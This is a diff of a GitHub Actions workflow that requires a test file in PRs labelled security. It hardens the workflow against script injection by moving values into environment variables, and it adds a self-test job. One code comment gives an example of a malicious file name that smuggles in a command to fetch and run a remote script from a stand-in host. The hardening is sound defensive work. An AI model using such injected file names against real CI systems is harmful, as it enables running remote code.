@@ -27,49 +27,46 @@ on:
       - labeled
       - unlabeled
       - ready_for_review
+  # Self-test fixture: any push that touches the gate workflow or its
+  # extracted detect-test-file.sh helper exercises the pattern matcher
+  # against a known fixture list so a future refactor that breaks the
+  # detector is caught in CI instead of when a real security PR slips
+  # through (finding #6 — gate is not self-tested).
+  push:
+    paths:
+      - '.github/workflows/security-test-gate.yml'
+      - '.github/workflows/scripts/detect-test-file.sh'
 
 jobs:
   security-test-gate:
     name: Security label — test-file required
     runs-on: ubuntu-latest
-
-    # Only apply to PRs that carry the 'security' label.
-    # If the label is not present this job finishes immediately as a no-op
-    # (exit 0) so it never blocks non-security PRs, and clears any stale
-    # failure when the 'security' label is removed.
-    if: contains(github.event.pull_request.labels.*.name, 'security')
+    # Only run on the gate trigger, not on the self-test push (the
+    # self-test job below handles that). Without this guard the job
+    # would attempt to read pull_request context on a push event and
+    # blow up.
+    if: github.event_name == 'pull_request' && contains(github.event.pull_request.labels.*.name, 'security')
 
     permissions:
       contents: read
       pull-requests: read
 
     steps:
-      - uses: actions/checkout@v6
-        with:
-          # Fetch the full diff between the base and head commits so
-          # `git diff --name-only` works without a shallow-clone issue.
-          fetch-depth: 0
-
+      # Collect changed files via the `gh` API rather than cloning the
+      # full repo + running `git diff` (finding #2 — checkout with
+      # fetch-depth: 0 is unnecessary). No clone, no merge-base juggling,
+      # and faster startup. Values are passed through env vars to avoid
+      # `${{ }}` shell interpolation (finding #1 — script-injection
+      # surface).
       - name: Collect changed files
         id: files
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR: ${{ github.event.pull_request.number }}
+          REPO: ${{ github.repository }}
         run: |
-          BASE_SHA="${{ github.event.pull_request.base.sha }}"
-          HEAD_SHA="${{ github.event.pull_request.head.sha }}"
-
-          echo "Base: $BASE_SHA"
-          echo "Head: $HEAD_SHA"
-
-          # List files changed between the merge-base and the PR head so
-          # rebased PRs (where base.sha != merge-base) are handled correctly.
-          MERGE_BASE=$(git merge-base "$BASE_SHA" "$HEAD_SHA" 2>/dev/null || echo "$BASE_SHA")
-          echo "Merge-base: $MERGE_BASE"
-
-          CHANGED=$(git diff --name-only "$MERGE_BASE" "$HEAD_SHA")
-          echo "Changed files:"
-          echo "$CHANGED"
-          # Store as newline-delimited output
+          set -euo pipefail
+          CHANGED=$(gh pr view "$PR" --repo "$REPO" --json files --jq '.files[].path')
           {
             echo "list<<EOF"
             echo "$CHANGED"
@@ -78,66 +75,27 @@ jobs:
 
       - name: Check for test file
         id: gate
+        env:
+          # Read the changed-file list from an env var instead of
+          # inlining `${{ steps.files.outputs.list }}` into the shell
+          # script body (finding #1 — script-injection surface). Even
+          # though `pull_request` (not `_target`) limits blast radius,
+          # a path with shell metacharacters like
+          # `foo"; curl evil.sh | sh; #.rs` could otherwise break out
+          # of the quoting.
+          # https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable
+          CHANGED: ${{ steps.files.outputs.list }}
         run: |
-          CHANGED="${{ steps.files.outputs.list }}"
-
-          # -------------------------------------------------------------------
-          # Test-file patterns
-          # A file counts as a "test file" when its path matches any of:
-          #
-          #   Rust integration tests  backend/*/tests/*.rs   (one dir level)
-          #   Rust unit test modules  any *.rs file with _test/_tests/test_ name
-          #   TypeScript tests        **/__tests__/**  or  *.test.ts / *.spec.ts
-          #   Frontend e2e            e2e/**
-          # -------------------------------------------------------------------
-
-          HAS_TEST=false
-
-          while IFS= read -r f; do
-            [ -z "$f" ] && continue
-
-            case "$f" in
-              # Rust integration test files (backend/<crate>/tests/*.rs)
-              # Note: bash `case` globs are single-level only; one wildcard
-              # is sufficient for the current repo layout.
-              backend/*/tests/*.rs)
-                echo "  [TEST] $f  (Rust integration test)"
-                HAS_TEST=true
-                ;;
-
-              # Rust files with _test / _tests / test_ naming conventions
-              *_test.rs | *_tests.rs | */test_*.rs | */tests.rs)
-                echo "  [TEST] $f  (Rust test module)"
-                HAS_TEST=true
-                ;;
-
-              # TypeScript __tests__ directories
-              */__tests__/*)
-                echo "  [TEST] $f  (TypeScript __tests__)"
-                HAS_TEST=true
-                ;;
-
-              # TypeScript test / spec files
-              *.test.ts | *.spec.ts | *.test.tsx | *.spec.tsx)
-                echo "  [TEST] $f  (TypeScript test/spec)"
-                HAS_TEST=true
-                ;;
-
-              # End-to-end tests
-              e2e/*)
-                echo "  [TEST] $f  (e2e)"
-                HAS_TEST=true
-                ;;
-            esac
-          done <<< "$CHANGED"
-
+          set -euo pipefail
+          HAS_TEST=$(bash .github/workflows/scripts/detect-test-file.sh <<< "$CHANGED")
           echo "has_test=$HAS_TEST" >> "$GITHUB_OUTPUT"
 
       - name: Enforce policy
+        env:
+          IS_DRAFT: ${{ github.event.pull_request.draft }}
+          HAS_TEST: ${{ steps.gate.outputs.has_test }}
         run: |
-          IS_DRAFT="${{ github.event.pull_request.draft }}"
-          HAS_TEST="${{ steps.gate.outputs.has_test }}"
-
+          set -euo pipefail
           if [ "$HAS_TEST" = "true" ]; then
             echo "PASS: at least one test file is present in this security PR."
             exit 0
@@ -172,3 +130,24 @@ jobs:
           echo "    End-to-end       : e2e/**"
           echo ""
           exit 1
+
+  # ---------------------------------------------------------------------
+  # Self-test fixture (finding #6 — gate is not self-tested)
+  #
+  # Runs detect-test-file.sh against a hand-written fixture list and
+  # asserts the expected verdict for each case. If a future refactor
+  # breaks the matcher (or accidentally regresses the bash `case`
+  # globs) this job fails BEFORE the live gate misclassifies a real
+  # security PR.
+  # ---------------------------------------------------------------------
+  self-test:
+    name: Self-test — detect-test-file.sh fixtures
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@v6
+      - name: Run fixture-based detector tests
+        run: |
+          set -euo pipefail
+          bash .github/workflows/scripts/detect-test-file.sh --self-test
